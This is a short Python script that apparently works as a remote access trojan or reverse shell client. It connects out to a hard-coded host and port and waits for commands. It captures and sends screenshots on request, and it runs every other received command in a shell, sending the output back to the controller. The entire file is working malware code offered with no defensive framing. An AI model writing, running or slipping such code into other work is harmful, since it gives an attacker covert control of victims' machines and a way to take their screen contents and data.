from doctest import OutputChecker
import socket, os, subprocess
from mss import mss

def screenschot():
    with mss() as sct:
        sct.shot(output="screen.png")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host = "192.168.1.14"
port = 12345

s.connect((host,port))

while True :
    command = s.recv(1024).decode("utf-8")

    if command == "goodbye":
        s.send(b'close')
        s.close()
        break
    elif command == "screenshot":
        screenschot()
        len_img = str(os.path.getsize("screen.png"))
        s.send(len_img.encode("utf-8"))
        with open("screen.png","rb") as img:
            s.send(img.read())
    elif command=="cd":
        result = subprocess.Popen("cd",shell=True, stdout=subprocess.PIPE)
        s.send(result.stdout.read())
    elif command[:2] == "cd":
        if os.path.exists(str(command[3:].replace("\n",""))):
            os.chdir(str(command[3:].replace("\n","")))
            s.send(os.popen("cd").read().encode("utf-8"))
    else:
        r = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = r.communicate()
        if result[1]:
            print(result[1])
            s.send(str(result[1]).encode("utf-8"))
        else:
            print(result[0])
            s.send(str(result[0]).encode("utf-8"))
            

